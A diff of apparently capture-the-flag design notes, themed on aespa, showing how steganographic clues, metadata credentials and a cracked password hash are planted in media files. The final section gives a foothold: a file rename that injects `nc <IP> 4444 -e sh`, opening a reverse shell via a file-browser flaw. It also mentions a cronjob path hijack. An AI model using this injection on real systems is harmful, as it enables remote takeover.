@@ -18,7 +18,12 @@ port:87: vulneravel a code injection pelo rename
 - leia o cronjob e faca path hijack: crie executavel supernova/singularity/singularity
 
 ## steganography nas midias
-exiftool -Artist="$z2QTv.Ap80vCBfUGUh5riTd3kzq9SrYJwrQGYuhOQDbbXG3R5cV2N8m3HxxJ3gPdUv7eSRKziL.nOBRtjtklu0" -xmptoolkit="$<yummy>$"   -Encoder="$6"  strange_phenomenon_giselle.mp4
+
+
+echo -n "aespaFiles" | base64
+
+exiftool -Artist="YWVzcGFGaWxlcw==" -xmptoolkit="Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//"   -Encoder=" $ 6$<yummy>$ "  strange_phenomenon_aeri.mp4
+
 
 
 no video em scene1
@@ -27,6 +32,7 @@ $ strings SALTy_and_sweet.gif
 ...
 ;l'existence precede l'essence==
 lexistence
+
 
 echo -n 'cooper' | openssl passwd -6 -salt 'lexistence' -stdin
 $6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//
@@ -40,6 +46,10 @@ hashcat -m 1800 -a 0 hash.txt p.txt
 ...
 Candidates.#1....: cooper -> cooper
 ...
+
+
+echo -n "YWVzcGFGaWxlcw==" | base64 -d
+
 
 
 
@@ -63,6 +73,8 @@ to delete
 sed -i '$d' "/home/renk/unb/tac cybersec/who-ae-you-ctf/app/media/welcome.mp4"
 
 
+
+
 scene1.html, inspecionar video: username (artista) e password (comentario) do ftp, ferramenta exiftool
 
 echo -n "cooper" | openssl kdf -keylen 32 -kdfopt digest:SHA256 -kdfopt pass:stdin -kdfopt salt:"l\`existence precede l\`essence" -kdfopt iter:600000 PBKDF2 | base64
@@ -70,19 +82,74 @@ MDE6QkI6MTE6QjM6ODE6Mzg6NjA6MjQ6QzM6REM6QkU6QkU6MkU6MDg6N0U6NzM6NzQ6QUI6QzY6
 MkQ6NzQ6RDY6NzI6QzY6MEU6RjY6OEY6Q0E6RUE6Qjg6OEI6N0QKCg==
 
 
-scene1.html, inspecionar gif : SALT da password pkbmc2. usado p criptografia: https://8gwifi.org/pbkdf.jsp. ferramenta comando `strings`
+'$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
+
+exiftool
+
+
 ftp: user aespa password cooper
     todo: binwalk coloca link/dica do filebrowser ('see port 97' )
 
 
-steghide embed -cf "PortalOfSelf.jpg" -ef secret.txt -p "complexity"
-cat "aespa 에스파  LEMONADE Complæxity Trailer .webm" "PortalOfSelf.jpg" > ae_glitch.webm
-binwalk -e ae_glitch.webm
 
+
+
+cat > who_are_they.txt << 'EOF'
+That wasn't the original aespa -- those were the aes that copied their looks. I think. It's complicated. 
+The aes are legit people, but they were born from digital memories that exist to them, from lives in the real world that they've never lived through.
+At some point in the set, those aes seemed like they were running away from the scary aespa in /run, but they ran straight through the portal to meet the others. 
+
+There was a group of aespa that kinda fused. 
+They were superstars who realized they're like a metaphor for how anyone can build their life to be so many different things, and how everyone is a different person for different people.
+It's kinda harsh, sometimes there's an expectation for you to be a certain way, the alternate selves are also a metaphor for that--
+--The same person is a different version of themselves for each different point of view, for each different person that knows about them.
+So who's to say which version is real? 
+
+Some aespa found their own answer to that.
+They're waiting for others to join, break free from world filled with aes aching to reach their own philosophical essence.
+You can use these if you wanna meet them  
+  user: complexity
+  password: complexitytrailer
+  Port of file-browser
+EOF
+
+<!-- inside PortOfSelf.jpg steghide who_are_they.txt password is complexity --> 
+steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt -p "complexity" -sf port_of_self.jpg
+
+<!-- inside ComplæxityTrailer.mp4 binwalk "PortOfSelf.jpg" -->
+cat complaexity_trailer.mp4 port_of_self.jpg > "complaexity.mp4"
+
+
+
+
+steghide embed -cf PortOfSelf.jpg -ef who_are_they.txt
+cat complaexity.mp4 PortOfSelf.jpg > complaexity_trailer.mp4
+
+steghide extract -sf ftp/extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg.jpg -p "complexity"
+binwalk -e complaexity.mp4
+steghide extract -sf extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg -p "complexity"
+wrote extracted data to "who_are_they.txt".
+
+
+steghide embed -cf "PortOfSelf.jpg" -ef secret.txt -p "complexity"
+cat "aespa 에스파  LEMONADE Complæxity Trailer .webm" "PortOfSelf.jpg" > ae_glitch.webm
+binwalk -e ae_glitch.webm
 
 cp "rich_man_trailer.webm" rich_man_trailer_combined.webm
 cat whats_happenning.txt >> rich_man_trailer_combined.webm
 
+
+base64 /run 
+
+
+### TODO
+bunch of steghide password hashes somewhere, /run ?
+complexity, flowers, 
+
+in file browser, a flowers gif w an audio 
+that winter reflection in mirror 
+
+steghide flowers in richman
 
 ## foothold: CVE-2026-35585  no file-browser
 - rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
